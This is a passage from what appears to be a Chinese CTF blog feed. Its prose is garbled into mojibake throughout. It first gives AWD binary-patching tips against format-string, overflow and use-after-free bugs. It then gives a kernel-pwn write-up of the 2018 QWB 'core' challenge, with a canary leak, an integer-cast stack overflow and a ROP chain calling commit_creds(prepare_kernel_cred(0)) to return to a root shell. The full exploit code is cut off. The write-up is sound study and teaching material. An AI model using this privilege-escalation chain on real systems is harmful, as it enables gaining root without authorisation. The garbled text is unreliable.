)</span>;<br></code></pre></td></tr></table></figure><h4 id="1-printfæ”¹puts"><strong>1.printfæ”¹puts</strong></h4><p>ç¨‹åºé‡Œæœ‰putsçš„è¯æŠŠcall printfæ”¹æˆcall puts</p><p>ä¿®æ”¹åä¼šåŠ \nï¼Œå¯èƒ½checkä¸é€šè¿‡</p><h4 id="2-printfåŠ -s"><strong>2.printfåŠ %s</strong></h4><p>printf(xxx)æ”¹ä¸ºprintf(â€œ%sâ€,xxxxx)</p><p>ç¨‹åºä¸­ä¸å­˜åœ¨%sè¿™ä¸ªå­—ç¬¦ï¼Œæ‰‹åŠ¨æ·»åŠ </p><p>åœ¨.eh_frameè¿™ä¸ªæ®µï¼ˆctrl+sè·³è½¬åˆ°æ®µï¼‰ä¸­å¡«å…¥%sï¼ˆ25 73ï¼‰è¿™ä¸ªå­—ç¬¦ä¸²</p><p>åœ¨ lea     rax, [rbp+format]ä¸‹é¢å¼€å§‹keypatch</p><p>æ”¹ä¸ºï¼š</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">mov edi<span class="hljs-punctuation">,</span><span class="hljs-number">0</span><span class="hljs-keyword">x</span>ï¼ˆ<span class="hljs-variable">%s</span>åœ°å€ï¼‰<span class="hljs-comment">;mov rsi,rax</span><br></code></pre></td></tr></table></figure><p><img src="/2023/06/24/AWDp/1.png" alt="1"></p><h4 id="å…¶ä»–æ€è·¯">å…¶ä»–æ€è·¯</h4><p>å¢åŠ ä»£ç ï¼ŒæŠŠprintfæ”¹æˆwriteï¼Œæ²¡æœ‰writeå¯ä»¥é€šè¿‡ç³»ç»Ÿè°ƒç”¨çš„å½¢å¼</p><h3 id="æ ˆæº¢å‡º">æ ˆæº¢å‡º</h3><p><strong>å®¹æ˜“é€ æˆæ ˆæº¢å‡ºçš„å‡½æ•°</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> * <span class="hljs-title function_">memcpy</span> <span class="hljs-params">( <span class="hljs-type">void</span> * destination, <span class="hljs-type">const</span> <span class="hljs-type">void</span> * source, <span class="hljs-type">size_t</span> num )</span>;<br><span class="hljs-type">char</span> * <span class="hljs-title function_">strcpy</span> <span class="hljs-params">( <span class="hljs-type">char</span> * destination, <span class="hljs-type">const</span> <span class="hljs-type">char</span> * source )</span>;<br><span class="hljs-type">char</span> * <span class="hljs-title function_">strncpy</span> <span class="hljs-params">( <span class="hljs-type">char</span> * destination, <span class="hljs-type">const</span> <span class="hljs-type">char</span> * source, <span class="hljs-type">size_t</span> num )</span>;<br><span class="hljs-type">char</span> * <span class="hljs-title function_">gets</span><span class="hljs-params">(<span class="hljs-type">char</span>*str)</span>;<br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> count)</span>;<br><span class="hljs-type">size_t</span> <span class="hljs-title function_">fread</span> <span class="hljs-params">( <span class="hljs-type">void</span> * ptr, <span class="hljs-type">size_t</span> size, <span class="hljs-type">size_t</span> count, FILE * stream )</span>;<br><span class="hljs-type">char</span> * <span class="hljs-title function_">fgets</span> <span class="hljs-params">( <span class="hljs-type">char</span> * str, <span class="hljs-type">int</span> num, FILE * stream )</span>;<br><span class="hljs-type">char</span> * <span class="hljs-title function_">strcat</span> <span class="hljs-params">( <span class="hljs-type">char</span> * destination, <span class="hljs-type">const</span> <span class="hljs-type">char</span> * source )</span>;<br><span class="hljs-built_in">scanf</span>(â€œ%sâ€, &amp;s);<br></code></pre></td></tr></table></figure><h4 id="1-æ”¹è¯»å­—èŠ‚æ•°"><strong>1.æ”¹è¯»å­—èŠ‚æ•°</strong></h4><h4 id="2-getsæ”¹read"><strong>2.getsæ”¹read</strong></h4><p>æ²¡æœ‰readå¯ä»¥é€šè¿‡ç³»ç»Ÿè°ƒç”¨çš„å½¢å¼ã€‚</p><p>æ±‡ç¼–é•¿åº¦å°½é‡çŸ­å§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">#length:16<br>#sys_read(0, s, 0x100uLL)<br><br>lea rsi, qword ptr [rbp+0xFFFFFFFFFFFFFFF1];xor edi,edi;nop;mov edx,0x100;xor eax,eax;syscall<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹å‰åå¯¹æ¯”ï¼š</p><p>æŠŠåŸæœ¬çš„lea raxæ”¹åˆ°rsi</p><p>ç”¨xor edi,edi;é€ 0</p><p>nop;æ¥é—´éš”é˜²æ­¢æ±‡ç¼–è§£æé”™è¯¯</p><p><img src="/2023/06/24/AWDp/image-20230605171436314.png" alt="image-20230605171436314"></p><p><img src="/2023/06/24/AWDp/image-20230605171525120.png" alt="image-20230605171525120"></p><h4 id="å…¶ä»–æ€è·¯-2">å…¶ä»–æ€è·¯</h4><p>å¢åŠ æ ˆç©ºé—´ sub rsp,xxxx</p><p>å¢åŠ ä»£ç ï¼Œè¿‡æ»¤ä¸å¯è§å­—ç¬¦ï¼š</p><ul><li>å¦‚æœè¦è·³è½¬åˆ°åº“å‡½æ•°ï¼Œcallå®ƒçš„pltåœ°å€å³å¯</li></ul><h3 id="UAF">UAF</h3><h4 id="1-nop-freeï¼ï¼ï¼">1.nop freeï¼ï¼ï¼</h4><h4 id="2-freeåæŒ‡é’ˆç½®0">2.freeåæŒ‡é’ˆç½®0</h4><p>call ef_frameåœ°å€ï¼Œå†™å…¥ï¼šcall free;æŒ‡é’ˆç½®é›¶çš„æ±‡ç¼–ï¼ˆå…·ä½“æŠ„é¢˜ç›®ï¼‰ï¼›ret</p><h5 id="ä¾‹ï¼šACTF-2019-babyheap"><strong>ä¾‹ï¼šACTF_2019_babyheap</strong></h5><p>å°±æ˜¯freeé‡Šæ”¾å †åï¼Œæˆ‘ä»¬è¦å†™æ®µä»£ç æŠŠæŒ‡é’ˆç½®0</p><p>ä¿®æ”¹å‰ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯æ²¡æœ‰ç©ºé—´çš„</p><p><img src="/2023/06/24/AWDp/image-20230605191528872.png" alt="image-20230605191528872"></p><p>æˆ‘ä»¬è¦æŠŠä»£ç æ”¾åˆ°<code>.eh_frame</code>æ®µé‡Œ</p><p>æˆ‘è¿™é‡ŒæŠŠ<code>call free</code> æ”¹ä¸º<code>call ï¼ˆeh_frameé‡Œçš„åœ°å€ï¼‰</code></p><p>æˆ‘è¿™é‡Œé€‰äº†<code>0x4010b0</code>,</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">call</span> <span class="hljs-number">0x4010b0</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>åœ¨<code>0x4010b0</code>å†™å…¥</p><p>#è¿™é‡Œæ˜¯ç…§æŠ„åŸæœ¬æ±‡ç¼–æ€ä¹ˆèµ‹å€¼ç»™rdi<br>#æˆ‘è¿™é‡Œçœç•¥ä¸€å¥èµ‹å€¼ï¼Œç›´æ¥ç”¨raxå¯„å­˜å™¨ï¼Œç„¶åæ¥ä¸€å¥raxç½®é›¶ï¼Œæœ€året</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">call free;<br>mov rax, qword ptr ds:ptr[rax*8]<br>#mov rdi, rax<br>mov qword ptr [rax], 0;<br>ret;<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹å‰ï¼š</p><p><img src="/2023/06/24/AWDp/image-20230605194401967.png" alt="image-20230605194401967"></p><p>ä¿®æ”¹åï¼š</p><p><img src="/2023/06/24/AWDp/image-20230605194240695.png" alt="image-20230605194240695"></p><p><img src="/2023/06/24/AWDp/image-20230605194307121.png" alt="image-20230605194307121"></p><p><img src="/2023/06/24/AWDp/image-20230605194332115.png" alt="image-20230605194332115"></p><p>åº”è¯¥æ˜¯å¯ä»¥äº†</p><h3 id="å †æº¢å‡º">å †æº¢å‡º</h3><h4 id="1-æ”¹è¯»å­—èŠ‚æ•°-2">1.æ”¹è¯»å­—èŠ‚æ•°</h4><h4 id="2-getsæ”¹æˆread">2.getsæ”¹æˆread</h4><p>å¢åŠ ä»£ç ï¼Œæ²¡æœ‰readå¯ä»¥é€šè¿‡ç³»ç»Ÿè°ƒç”¨çš„å½¢å¼ã€‚</p><h4 id="3-å¢åŠ mallocç”³è¯·çš„ç©ºé—´">3.å¢åŠ mallocç”³è¯·çš„ç©ºé—´</h4><h3 id="Off-by-one-null">Off by one/null</h3><p>æ”¹è¯»å­—èŠ‚æ•°</p><h3 id="æ¡ä»¶ç«äº‰">æ¡ä»¶ç«äº‰</h3><p>sleepç­‰æ¶ˆè€—æ—¶é—´çš„å‡½æ•°nopæ‰</p><h3 id="æ•´æ•°æº¢å‡º">æ•´æ•°æº¢å‡º</h3><p>æœ‰ç¬¦å·è·³è½¬æ”¹ä¸ºæ— ç¬¦å·ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs assembly">æ— ç¬¦å·è·³è½¬ï¼š<br>JA ;æ— ç¬¦å·å¤§äºåˆ™è·³è½¬<br>JNA ;æ— ç¬¦å·ä¸å¤§äºåˆ™è·³è½¬<br>JAE ;æ— ç¬¦å·å¤§äºç­‰äºåˆ™è·³è½¬ åŒJNB<br>JNAE ;æ— ç¬¦å·ä¸å¤§äºç­‰äºåˆ™è·³è½¬ åŒJB<br>JB ;æ— ç¬¦å·å°äºåˆ™è·³è½¬<br>JNB ;æ— ç¬¦å·ä¸å°äºåˆ™è·³è½¬<br>JBE ;æ— ç¬¦å·å°äºç­‰äºåˆ™è·³è½¬ åŒJNA<br>JNBE ;æ— ç¬¦å·ä¸å°äºç­‰äºåˆ™è·³è½¬ åŒJA<br>æœ‰ç¬¦å·è·³è½¬ï¼š<br>JG ;æœ‰ç¬¦å·å¤§äºåˆ™è·³è½¬<br>JNG ;æœ‰ç¬¦å·ä¸å¤§äºåˆ™è·³è½¬<br>JGE ;æœ‰ç¬¦å·å¤§äºç­‰äºåˆ™è·³è½¬ åŒJNL<br>JNGE ;æœ‰ç¬¦å·ä¸å¤§äºç­‰äºåˆ™è·³è½¬ åŒJL<br>JL ;æœ‰ç¬¦å·å°äºåˆ™è·³è½¬<br>JNL ;æœ‰ç¬¦å·ä¸å°äºåˆ™è·³è½¬<br>JLE ;æœ‰ç¬¦å·å°äºç­‰äºåˆ™è·³è½¬ åŒJNG<br>JNLE ;æœ‰ç¬¦å·ä¸å°äºç­‰äºåˆ™è·³è½¬ åŒJG<br></code></pre></td></tr></table></figure><h3 id="æ•°ç»„è¶Šç•Œ">æ•°ç»„è¶Šç•Œ</h3><p>æœ‰ç¬¦å·è·³è½¬æ”¹ä¸ºæ— ç¬¦å·</p><p>å¢åŠ ä»£ç ï¼Œåˆ¤æ–­indexå¤§å°</p><h3 id="å‘½ä»¤æ‰§è¡Œ">å‘½ä»¤æ‰§è¡Œ</h3><p>æŠŠå‘½ä»¤æ‰§è¡Œå‡½æ•°nopæ‰</p><p><strong>å®¹æ˜“é€ æˆå‘½ä»¤æ‰§è¡Œçš„å‡½æ•°</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">FILE *<span class="hljs-title function_">popen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *command, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *type)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">system</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *command)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">execve</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *pathname, <span class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[], <span class="hljs-type">char</span> *<span class="hljs-type">const</span> envp[])</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">execl</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *arg, ...)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">execlp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *arg, ...)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">execle</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *arg, <span class="hljs-type">char</span> * <span class="hljs-type">const</span> envp[])</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">execv</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *path, <span class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[])</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">execvp</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[])</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">execvpe</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *file, <span class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[], <span class="hljs-type">char</span> *<span class="hljs-type">const</span> envp[])</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">execveat</span><span class="hljs-params">(<span class="hljs-type">int</span> dirfd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *pathname, <span class="hljs-type">char</span> *<span class="hljs-type">const</span> argv[], <span class="hljs-type">char</span> *<span class="hljs-type">const</span>  envp[], <span class="hljs-type">int</span> flags)</span>;<br></code></pre></td></tr></table></figure><h3 id="ä¸å¤ªä¼˜é›…çš„æ–¹æ³•">ä¸å¤ªä¼˜é›…çš„æ–¹æ³•</h3><p>nop æ‰ free</p><p>æŠŠfreeçš„pltè¡¨æ”¹æˆret</p><p>nop æ‰ malloc</p><p>å¢åŠ ä»£ç ï¼Œåœ¨è¯»çš„å­—èŠ‚ä¸­è¿‡æ»¤ä¸€äº›ç‰¹æ®Šçš„å­—ç¬¦</p><p>æ‰“ä¹±gotè¡¨</p><h3 id="tips">tips</h3><p>éšæœºåº”å˜ï¼Œä¸€åˆ‡éœ€è¦åŠ é€»è¾‘çš„patchéƒ½å¯ä»¥æŠŠä»£ç æ”¾<code>.eh_frame</code>æ®µé‡Œã€‚</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IDA_patch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kernel pwnå…¥é—¨</title>
    <link href="/2023/02/05/kernel%E5%85%A5%E9%97%A8/"/>
    <url>/2023/02/05/kernel%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€ï¼š">å‰è¨€ï¼š</h2><h2 id="01-kernel-rop">01.kernel rop</h2><h3 id="2018-å¼ºç½‘æ¯-core">2018 å¼ºç½‘æ¯ - core</h3><h4 id="0x01æ–‡ä»¶åˆ†æ">0x01æ–‡ä»¶åˆ†æ</h4><p>ä¸‹è½½é™„ä»¶ï¼Œæœ‰å››ä¸ªæ–‡ä»¶</p><p>bzImageæ˜¯å‹ç¼©gzipå‹ç¼©çš„å†…æ ¸æ–‡ä»¶</p><p>core.cpioæ˜¯å‹ç¼©çš„æ–‡ä»¶ç³»ç»Ÿ</p><p>start.shæ˜¯å¯åŠ¨è„šæœ¬</p><p>vmlinuxæ˜¯é™æ€ç¼–è¯‘æœªå‹ç¼©çš„å†…æ ¸æ–‡ä»¶</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2018core1-1684501921223.png" alt="2018core1"></p><p>æˆ‘ä»¬å¯ä»¥ä»vmlinuxä¸­å¯»æ‰¾gadget</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">time ropper --file ./vmlinux --nocolor &gt; g1<br></code></pre></td></tr></table></figure><p>å½“ç„¶é¢˜ç›®æ²¡æœ‰vmlinuxçš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ <a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">extract-vmlinux</a> è§£å‹bzImage</p><p>ä½¿ç”¨æ–¹æ³•ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./extract-vmlinux ./bzImage &gt; vmlinux<br></code></pre></td></tr></table></figure><h5 id="1-è§‚å¯Ÿstart-sh">1.è§‚å¯Ÿstart. sh</h5><p>åº”è¯¥è¦çŸ¥é“å¼€å¯äº†kaslrä¿æŠ¤ï¼Œç„¶åé‚£ä¸ª-mè¦æ”¹å†…å­˜ä»64åˆ°128ï¼Œä¸ç„¶æ— æ³•å¯åŠ¨</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2018core2-1684501921223.png" alt="2018core2"></p><h5 id="2-è§£å‹-cpioè§‚å¯Ÿinit">2.è§£å‹.cpioè§‚å¯Ÿinit</h5><p>è§£å‹å‰è¦å…ˆåŠ .gzåç¼€ï¼Œä¸ç„¶gunzipæ— æ³•è¯†åˆ«</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir core<br>cd core<br>mv ../core.cpio core.cpio.gz<br>gunzip ./core.cpio.gz<br>cpio -idm &lt; ./core.cpio<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å°±æ˜¯æŒ‚è½½ä¸€äº›ç›®å½•ï¼Œæˆ‘ä»¬æŠŠpoweroffå®šæ—¶120å…³æœºç»™æ³¨é‡Šæ‰ï¼Œæ–¹ä¾¿è°ƒè¯•</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2018core3-1684501921223.png" alt="2018core3"></p><p><strong>è¦ç‰¹åˆ«æ³¨æ„çš„è¯­å¥ï¼š</strong></p><p><code>cat /proc/kallsyms &gt; /tmp/kallsyms</code></p><p>æŠŠ <code>kallsyms</code> çš„å†…å®¹ä¿å­˜åˆ°äº† <code>/tmp/kallsyms</code> ä¸­</p><p><code>echo 1 &gt; /proc/sys/kernel/kptr_restrict</code></p><p>kptr_restrictè®¾ä¸º1ï¼Œå°±ä¸èƒ½é€šè¿‡/proc/kallsymsæŸ¥çœ‹å†…æ ¸ç¬¦å·çš„åœ°å€ï¼Œä½†æ˜¯å‰ä¸€å¥å·²ç»æŠŠå®ƒå†™å…¥äº†/tmp/kallsyms</p><p><code>echo 1 &gt; /proc/sys/kernel/dmesg_restrict</code></p><p>dmesg_restrictè®¾ä¸º1åï¼Œæ— ç‰¹æƒçš„ç”¨æˆ·æ˜¯æ— æ³•ä½¿ç”¨dmesgæŸ¥çœ‹æ¥è‡ªå†…æ ¸æ—¥å¿—ç¼“å†²åŒºçš„æ¶ˆæ¯</p><p><code>insmod /core.ko</code></p><p>å¯ä»¥çœ‹åˆ°<code>insmod</code>å‘½ä»¤è½½å…¥äº†core.koæ¨¡å—ï¼Œé‡ç‚¹å…³æ³¨è¿™æ¨¡å—</p><h5 id="3-è§‚å¯Ÿé©±åŠ¨core-ko">3.è§‚å¯Ÿé©±åŠ¨core.ko</h5><p>å¼€å¯äº†canary</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2018core4-1684501921223.png" alt="2018core4"></p><p><strong>idaæ‹¿å‡ºæ¥åˆ†æ</strong></p><p>__int64 init_module()åˆ›å»ºäº†/porc/core</p><p>exit_core()åˆ é™¤äº†åˆ›å»ºçš„core</p><p>__int64 __fastcall core_ioctl()æœ‰ä¸‰ä¸ªé€‰é¡¹ï¼Œåˆ†åˆ«è°ƒç”¨ <strong>core_read()</strong>ï¼Œ<strong>core_copy_func()</strong> å’Œè®¾ç½®å…¨å±€å˜é‡ <strong>off</strong></p><p><strong>core_read():</strong></p><p>è¿™ä¸ªå‡½æ•°æ˜¯å¾€&amp;v5[off]å†™0x40é•¿åº¦åˆ°ç”¨æˆ·ç©ºé—´</p><p>ä½†æ˜¯offæˆ‘ä»¬èƒ½æ§åˆ¶ï¼Œèƒ½æ³„éœ²æŒ‡å®šåœ°å€</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2018core5-1684501921223.png" alt="2018core5"></p><p><strong>core_copy_func():</strong></p><p>qmemcpy(v2,&amp;name,(unsigned_int16)a1)</p><p>å°±æ˜¯æŠŠå…¨å±€å˜é‡nameæ‹·è´a1é•¿åº¦åˆ°å±€éƒ¨å˜é‡v2</p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬ä¼ çš„a1æ˜¯int64ï¼Œè€Œqmemcpyç”¨çš„æ˜¯å¼ºè½¬çš„unsigned int16</p><p>æˆ‘ä»¬è¾“ä¸€ä¸ªå¤§è´Ÿæ•°ç»•è¿‡å‰é¢63æ£€æµ‹ï¼Œè€Œå¼ºè½¬åå˜ä¸ºä¸€ä¸ªåˆç†çš„å¤Ÿé•¿çš„é•¿åº¦ï¼Œå¯ä»¥é€ æˆæ ˆæº¢å‡º</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2018core6-1684501921223.png" alt="2018core6"></p><p><strong>core_write():</strong></p><p>å¯ä»¥å¾€å…¨å±€å˜é‡nameé‡Œå†™a2åœ°å€ä¸Šå°äºç­‰äº0x800é•¿åº¦çš„å€¼ï¼Œ</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2018core7-1684501921223.png" alt="2018core7"></p><h4 id="0x02æ”»å‡»æ­¥éª¤">0x02æ”»å‡»æ­¥éª¤</h4><p>1.ä¿å­˜ç”¨æˆ·æ€å¯„å­˜å™¨å€¼</p><p>2.è·å–<code>prepare_kernel_cred</code>ï¼Œ<code>commit_creds</code>çš„åœ°å€</p><p>3.æ³„éœ²<code>canary</code></p><p>4.æ ˆæº¢å‡ºå†™å…¥<code>rop</code>æ‰§è¡Œ<code>commit_creds(prepare_kernel_cred(0))</code>ï¼Œè·å¾—rootåç€é™†å›ç”¨æˆ·æ€èµ·shell</p><h4 id="0x03è°ƒè¯•æ–¹æ³•">0x03è°ƒè¯•æ–¹æ³•</h4><p><a href="https://x3h1n.github.io/2019/07/04/2018%E5%BC%BA%E7%BD%91%E6%9D%AF-core/">å‚è€ƒ</a></p><p>start.shå¯åŠ¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /sys/module/core/sections/.text<br></code></pre></td></tr></table></figure><p>åœ¨qemuä¸­æŸ¥æ‰¾core.koçš„.textæ®µçš„åœ°å€</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2018core11-1684501921223.png" alt="2018core11"></p><p>å¯åŠ¨è‡ªå·±è§£å‹ç¼©bzimageé‡Œé¢çš„./vmlinux</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo gdb ./vmlinux -q<br></code></pre></td></tr></table></figure><p>æ¥ç€<code>add-symbol-file ./core.ko 0xffffffffc0345000</code></p><p>è½½å…¥core.koçš„ç¬¦å·åœ°å€</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">add-symbol-file ./core.ko 0xffffffffc0345000</span><br>add symbol table from file &quot;./core.ko&quot; at<br>.text_addr = 0xffffffffc0345000<br>Reading symbols from ./core.ko...<br>(No debugging symbols found in ./core.ko)<br></code></pre></td></tr></table></figure><p>ç„¶åè¿æ¥ç«¯å£</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">target remote localhost:1234<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å°±èƒ½æ–­ç‚¹å‡½æ•°åäº†ï¼Œé…åˆå‘½ä»¤continue,ç„¶åè¿è¡Œç¨‹åºå°±èƒ½åœåœ¨æŒ‡å®šå‡½æ•°</p><h4 id="0x04exp">0x04exp</h4><p><strong>è§£é‡Šä¸‹ropéƒ¨åˆ†ï¼š</strong></p><p>è¿™éƒ¨åˆ†æ‰§è¡Œå®Œåraxå˜ä¸ºäº†prepare_kernel_cred_addr-&gt;0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">rop[i++] = <span class="hljs-number">0xffffffff81000b2f</span> + offset; <span class="hljs-comment">// pop rdi; ret</span><br>rop[i++] = <span class="hljs-number">0</span>;<br>rop[i++] = prepare_kernel_cred_addr;         <span class="hljs-comment">// prepare_kernel_cred(0)</span><br>    <br></code></pre></td></tr></table></figure><p>å‡è®¾å®šè¿™éƒ¨åˆ†ropé“¾ä¸º1ï¼Œ2ï¼Œ3</p><p>pop rdxä½¿rdx=rop2ï¼Œæ¥ç€retåˆ°rop2</p><p>pop rcxä½¿rcx=rop3ï¼Œæ¥ç€retåˆ°rop3</p><p>mov rdi,raxä½¿rdi=prepare_kernel_cred_addr-&gt;0ï¼Œç„¶åcall rdxï¼Œä¹Ÿå°±æ˜¯è·³è½¬åˆ°rop2</p><p>pop rcxä½¿rcx=rop3ï¼Œæ¥ç€retå°±æ˜¯æ‰§è¡Œcommit_creds_addräº†ï¼ˆrdiå·²ç»æ§åˆ¶ä¸ºäº†prepare_kernel_cred_addr-&gt;0ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">rop[i++] = <span class="hljs-number">0xffffffff810a0f49</span> + offset; <span class="hljs-comment">// pop rdx; ret  1</span><br>rop[i++] = <span class="hljs-number">0xffffffff81021e53</span> + offset; <span class="hljs-comment">// pop rcx; ret  2</span><br>rop[i++] = <span class="hljs-number">0xffffffff8101aa6a</span> + offset; <span class="hljs-comment">// mov rdi, rax; call rdx;  3</span><br>rop[i++] = commit_creds_addr;<br></code></pre></td></tr></table></figure><p>æ¥ç€å°±æ˜¯ç”¨swapgsï¼Œiretqç€é™†å›ç”¨æˆ·æ€ï¼Œèµ·shell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">rop[i++] = <span class="hljs-number">0xffffffff81a012da</span> + offset; <span class="hljs-comment">// swapgs; popfq; ret</span><br>rop[i++] = <span class="hljs-number">0</span>;<br>rop[i++] = <span class="hljs-number">0xffffffff81050ac2</span> + offset; <span class="hljs-comment">// iretq; ret; </span><br>rop[i++] = (<span class="hljs-type">size_t</span>)spawn_shell;         <span class="hljs-comment">// rip </span><br>rop[i++] = user_cs;<br>rop[i++] = user_rflags;<br>rop[i++] = user_sp;<br>rop[i++] = user_ss;<br></code></pre></td></tr></table></figure><p>ropï¼špaddingâ€“&gt;canary-&gt;commit_creds(prepare_kernel_cred(0))-&gt;swapgs-&gt;iretq-&gt;system(â€œâ€/bin/sh&quot;)</p><p><strong>å®Œæ•´expï¼š</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 